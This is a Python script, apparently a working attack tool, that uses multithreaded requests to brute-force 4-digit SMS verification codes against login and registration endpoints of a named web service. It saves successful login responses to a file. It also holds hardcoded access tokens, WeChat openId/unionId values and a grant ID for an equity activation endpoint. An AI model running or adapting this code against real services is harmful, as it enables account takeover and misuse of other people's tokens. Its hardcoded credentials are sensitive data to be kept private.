#!/usr/bin/env python

import requests
import sys, json, time
import threading

phone = "13800000000"
#phone = "17344442222"

def registerUser(number="1111"):
    url = "https://sitsehwx.ciics.cn/user/uuser/clerkRegister"
    header = {}
    header['Content-type'] =  "application/json"
    data = {}
    data["mobile"] = "13800000000"
    data["verifyCode"] = number
    data["headImgUrl"] = ""
    data["userSource"] = 2
    data["openId"] = "oFUWb5R_iU7jQSqkE9zXSF-dZUNk"
    data["unionId"] = "oZgdjwaVlKh97xWBo9bwgU_cwFlM"
    data["roleId"] = 3
    data["employeeCode"] = "20211119"
    data["shopName"] = "立健青岛人民路店"
    data["shopCode"] = "123456"
    data["storeCode"] = "100010"
    data["storeName"] = "山东立健-立健api测试用勿删"
    data["realName"] = "卢俊义"
    r = requests.post(url, headers=header, data=json.dumps(data))
    #print(r.json())
    print(number)
    if r.json()['code'] == 0:
        print("##" * 500)
        print("$$$$$$$$$$$$$$$$$$$$$$$" + str(number))
        print(r.json())
        with open('register.txt','a+') as f:
            f.write(json.dumps(r.json()))
        print("##" * 500)
        sys.exit()


def sendcode():
    global phone
    url = "https://sitsehwx.ciics.cn/user/ucsms/sendCountdown"
    header = {}
    data = phone
    r = requests.post(url, data=data)
    print(r.json())

def test(number="1111"):
    global phone
    url = "http://sitsehwx.ciics.cn/user/uuser/loginByMobile"
    header = {}
    header['Content-Type'] = "application/json"
    data = {}
    #data["mobile"] = "18611143543"
    data["mobile"] = phone
    data["verifyCode"] = number
    data["userSource"] = 1
    r = requests.post(url, headers=header, data=json.dumps(data))
    print(number)
    if r.json()['loginCode'] == 0:
        print("##" * 500)
        print("$$$$$$$$$$$$$$$$$$$$$$$" + str(number))
        print(r.json())
        with open('phone.txt','w') as f:
            f.write(json.dumps(r.json()))
        print("##" * 500)
        sys.exit()

def activeCode(mynum=0):
    url = "http://sitsehwx.ciics.cn/equity/equitygrantdetail/activation"
    token = ['f7111c6bc8e44e6583af44d5d2877a05','6b9a145b8728489aa5d7166324c0d8c7']
    myId = ["842511779761225735","842511779761225735"]
    header = {}
    header['accessToken'] = token[mynum]
    param = {}
    param['grantDetailId'] = myId[0]
    r = requests.post(url, headers=header, params=param)
    print(r.url)
    print(r.text)

#sendcode()

time.sleep(5)

tmp = 1000
for j in range(0,1000,50):
    print(j)
    threadingPool = []
    for i in range(tmp,tmp + j):
        tmp = i
        #t = threading.Thread(target=registerUser,args=(i,))
        t = threading.Thread(target=test,args=(i,))
        threadingPool.append(t)
        t.start()
    for k in threadingPool:
        k.join()

threadingPool2 = []
for i in range(0):
    activeCode(i)
    #t = threading.Thread(target=activeCode,args=(i,))
    #threadingPool2.append(t)
    #t.start()
for k in threadingPool2:
    k.join()
